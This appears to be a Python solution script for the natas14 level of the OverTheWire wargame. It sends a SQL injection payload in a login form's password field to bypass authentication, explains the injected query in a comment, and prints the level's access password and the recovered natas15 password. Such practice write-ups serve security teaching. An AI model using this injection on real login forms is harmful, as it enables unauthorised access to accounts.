from bs4 import BeautifulSoup
import requests

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())
        
lvl_name = 'natas14'
url = f'http://{lvl_name}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP')
my_params = {"username":"", "password": '" OR "X" = "X'}
res, soup = make()
writeResponse()

'''
Who doesn't love a good bit of SQL Injection? 

SELECT * FROM `users` WHERE username = ? AND password = ?; #That's a hard condition to fill! But with a little change in the password 
                                                           #section (with implicit parentheses added): 
SELECT * FROM `users` WHERE (username = ? AND password = ?) OR "X" = "X"; # Much easier to satisfy!

Username: natas15
Password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
'''